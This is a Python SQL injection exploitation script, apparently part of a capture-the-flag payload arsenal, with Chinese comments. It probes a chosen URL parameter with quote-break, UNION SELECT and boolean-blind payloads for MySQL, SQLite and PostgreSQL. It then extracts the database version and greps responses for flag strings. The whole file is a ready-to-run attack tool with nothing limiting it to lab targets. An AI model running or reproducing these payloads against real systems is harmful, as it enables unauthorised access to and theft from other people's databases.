#!/usr/bin/env python3
"""SQL 注入 UNION 盲注 / 报错探测 + 数据回显提取。

用法：
    python3 arsenal/payloads/sqli_union.py --url 'http://host/page.php?id=1' --param id
    python3 arsenal/payloads/sqli_union.py --url 'http://host/api' --method POST --data 'id=1' --param id

成功：输出 flag 或提取的数据库内容；失败：输出响应差异摘要。
"""
import argparse
import re
import requests
import sys


def _probe(url, method, headers, data, param, payload, timeout=15):
    """发送一次探测，返回 status/长度/正文。"""
    d = (data or "").copy() if data else {}
    if param in d:
        d[param] = payload
    kwargs = {"url": url, "method": method, "headers": headers or {}, "timeout": timeout, "verify": False}
    if method.upper() == "GET":
        kwargs["params"] = {param: payload}
        kwargs["data"] = None
    else:
        kwargs["data"] = d or {param: payload}
    try:
        r = requests.request(**kwargs)
        return r.status_code, len(r.content), r.text
    except Exception as e:
        return -1, 0, str(e)


def main():
    parser = argparse.ArgumentParser(description="SQLi UNION 探测利用脚本")
    parser.add_argument("--url", required=True)
    parser.add_argument("--param", required=True)
    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--data", default="", help="POST body 模板，如 id=1&name=x")
    parser.add_argument("--headers", default="", help="请求头，JSON 字符串")
    parser.add_argument("--marker", default="SQliRes", help="UNION 回显占位标记")
    parser.add_argument("--db", default="mysql", choices=["mysql", "sqlite", "pg"])
    parser.add_argument("--timeout", type=int, default=15)
    args = parser.parse_args()

    import json
    headers = json.loads(args.headers) if args.headers else {}
    data = {k: v for k, v in (p.split("=", 1) for p in args.data.split("&") if p)} if args.data else {}

    # 1) 基线
    base_status, base_len, base_text = _probe(args.url, args.method, headers, data, args.param, "1", args.timeout)
    print(f"[base] status={base_status} len={base_len}")

    # 2) 单引号报错基线
    err_status, err_len, err_text = _probe(args.url, args.method, headers, data, args.param, "1'", args.timeout)
    print(f"[error] status={err_status} len={err_len}")

    # 3) UNION 探测（先猜 1 列）
    if args.db == "mysql":
        union = f"1' UNION SELECT {args.marker}#"
    elif args.db == "sqlite":
        union = f"1' UNION SELECT '{args.marker}'--"
    else:
        union = f"1' UNION SELECT '{args.marker}'--"
    u_status, u_len, u_text = _probe(args.url, args.method, headers, data, args.param, union, args.timeout)
    print(f"[union] status={u_status} len={u_len} marker_count={u_text.count(args.marker)}")

    if args.marker in u_text:
        # 尝试提取版本 / 当前数据库名
        if args.db == "mysql":
            extract = f"1' UNION SELECT CONCAT('{args.marker}',version(),'{args.marker}')#"
        elif args.db == "sqlite":
            extract = f"1' UNION SELECT '{args.marker}'||sqlite_version()||'{args.marker}'--"
        else:
            extract = f"1' UNION SELECT '{args.marker}'||version()||'{args.marker}'--"
        _, _, ext_text = _probe(args.url, args.method, headers, data, args.param, extract, args.timeout)
        m = re.search(re.escape(args.marker) + r"(.+?)" + re.escape(args.marker), ext_text)
        if m:
            print(f"[extract] version={m.group(1)}")
        print(f"[flag_candidates] {re.findall(r'flag\{[^}]+\}|FLAG_[A-Z0-9_]+|TSCT?\{[^}]+\}', ext_text, re.I)}")
        return 0

    # 4) 布尔盲注：and 1=1 vs and 1=2 长度差异
    t1_status, t1_len, _ = _probe(args.url, args.method, headers, data, args.param, "1' AND 1=1--", args.timeout)
    t2_status, t2_len, _ = _probe(args.url, args.method, headers, data, args.param, "1' AND 1=2--", args.timeout)
    print(f"[bool] true={t1_len} false={t2_len} diff={abs(t1_len-t2_len)}")
    if abs(t1_len - t2_len) > 5:
        print("[verdict] 存在布尔盲注差异")
    else:
        print("[verdict] 未发现可识别注入点")
    return 1


if __name__ == "__main__":
    sys.exit(main())
